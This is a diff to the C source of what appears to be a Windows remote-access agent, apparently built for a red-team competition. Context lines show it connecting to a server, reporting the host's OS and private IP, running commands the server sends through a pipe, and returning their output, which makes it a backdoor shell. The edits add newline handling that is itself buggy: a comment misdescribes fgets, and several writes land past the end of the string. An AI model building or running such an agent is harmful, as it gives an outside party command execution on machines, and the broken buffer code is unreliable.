@@ -83,7 +83,7 @@ int main(void) {
     SOCKET thread;
     
     // The first message sent to the Server is the OS
-    const char* osMessage = "Windows";
+    const char* osMessage = "Windows\n";
     send(clientSocket, osMessage, strnlen(osMessage, 8), 0);
 
     // The second message sent to the Server is the host address.
@@ -92,7 +92,7 @@ int main(void) {
     // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
     // Private IP address that is unique for that competition
     char host[256];
-    char ipstr[INET_ADDRSTRLEN];
+    char ipstr[INET_ADDRSTRLEN + 2];
     struct addrinfo hints, * res, * p;
     int status;
 
@@ -116,7 +116,7 @@ int main(void) {
 
             // Convert the IP to a string
             inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
-            printf("IP Address: %s\n", ipstr);
+            ipstr[strnlen(ipstr, 17) + 1] = '\n';
             send(clientSocket, ipstr, strnlen(ipstr, 16), 0);
 
             // Break after the first IP address is found
@@ -164,7 +164,11 @@ int main(void) {
                 }
 
                 // Read the output a line and send it back to the Server
-                while (fgets(commandOutput, 8192, pipe) != NULL) {
+                while (fgets(commandOutput, 8190, pipe) != NULL) {
+                    // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
+                    int len = strnlen(commandOutput, 8190) + 1;
+                    commandOutput[len + 1] = '\n';
+                    commandOutput[len + 2] = '\0';
                     printf("%s", commandOutput);
                     send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
                 }
